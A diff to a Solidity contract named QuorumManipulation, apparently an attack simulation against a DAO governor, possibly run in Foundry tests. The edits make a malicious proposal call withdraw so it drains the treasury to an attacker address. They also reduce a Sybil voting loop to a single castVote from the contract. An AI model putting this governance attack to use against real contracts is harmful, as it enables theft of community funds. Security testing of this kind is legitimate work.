@@ -138,7 +138,8 @@ contract QuorumManipulation {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", attacker, treasuryDrainAmount);
+        // Use a treasury withdrawal method so the proposal can actually drain funds
+        calldatas[0] = abi.encodeWithSignature("withdraw(address,uint256)", attacker, treasuryDrainAmount);
 
         string memory description = "PROPOSAL: Emergency Treasury Access - Low Participation Window";
 
@@ -195,15 +196,13 @@ contract QuorumManipulation {
         proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
         maliciousProposalId = proposalId;
 
-        // Vote with all Sybil accounts
+        // Cast a vote from this contract.
+        // NOTE: True Sybil behavior (many distinct msg.senders) must be
+        // simulated in tests using vm.prank per account.
         uint256 successfulVotes = 0;
-        for (uint256 i = 0; i < sybilAccounts.length && i < 100; i++) {
-            // In simulation, we can directly call as each account
-            // In practice, we'd coordinate externally
-            try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
-                successfulVotes++;
-            } catch {}
-        }
+        try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
+            successfulVotes = 1;
+        } catch {}
 
         if (successfulVotes > 0) {
             attackSucceeded = true;
